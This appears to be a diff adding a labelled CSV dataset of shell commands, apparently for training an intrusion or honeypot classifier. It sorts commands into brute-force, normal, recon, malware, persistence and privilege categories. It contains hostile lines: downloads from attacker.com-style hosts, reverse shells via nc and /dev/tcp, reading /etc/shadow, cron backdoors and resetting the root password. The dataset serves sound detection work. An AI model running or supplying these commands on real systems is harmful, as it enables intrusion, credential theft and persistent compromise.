@@ -1,0 +1,76 @@
+command,label
+login root,BruteForce
+login admin,BruteForce
+login user,BruteForce
+root,BruteForce
+admin,BruteForce
+123456,BruteForce
+password,BruteForce
+guest,BruteForce
+oracle,BruteForce
+ftp,BruteForce
+mysql,BruteForce
+test,BruteForce
+ls,Normal
+pwd,Normal
+cd /home,Normal
+cd /tmp,Normal
+touch file.txt,Normal
+mkdir testdir,Normal
+rm file.txt,Normal
+echo hello,Normal
+whoami,Recon
+id,Recon
+uname -a,Recon
+hostname,Recon
+uptime,Recon
+w,Recon
+last,Recon
+ps aux,Recon
+top,Recon
+df -h,Recon
+free -m,Recon
+netstat -tulnp,Recon
+ss -tulnp,Recon
+ifconfig,Recon
+ip a,Recon
+cat /etc/passwd,Recon
+cat /etc/shadow,Recon
+ls -la /root,Recon
+history,Recon
+env,Recon
+cat ~/.bash_history,Recon
+find / -name "*.sh",Recon
+find / -perm -4000,Recon
+wget http://malicious.com/bot.sh,Malware
+curl http://evil.com/script.sh,Malware
+wget http://1.2.3.4/m.sh -O /tmp/m.sh,Malware
+curl -O http://attacker.com/backdoor.sh,Malware
+tftp 1.2.3.4 -c get shell.sh,Malware
+ftp 1.2.3.4,Malware
+scp attacker@1.2.3.4:/file.sh .,Malware
+nc attacker.com 4444 -e /bin/sh,Malware
+bash -i >& /dev/tcp/attacker.com/4444 0>&1,Malware
+python -c 'import socket;...',Malware
+perl -e 'use Socket;...',Malware
+php -r '$sock=fsockopen(...);',Malware
+chmod +x bot.sh,Malware
+chmod 777 backdoor.sh,Malware
+./bot.sh,Malware
+sh bot.sh,Malware
+bash bot.sh,Malware
+nohup ./bot.sh &,Malware
+crontab -e,Persistence
+echo "* * * * * /tmp/bot.sh" >> /etc/crontab,Persistence
+echo "@reboot /tmp/backdoor.sh" >> crontab,Persistence
+systemctl enable ssh,Persistence
+service ssh restart,Persistence
+sudo su,Privilege
+sudo bash,Privilege
+sudo -i,Privilege
+su root,Privilege
+sudo passwd root,Privilege
+sudo useradd hacker,Privilege
+sudo chmod 777 /etc/passwd,Privilege
+echo root:root | chpasswd,Privilege
+chown root:root /tmp/file,Privilege
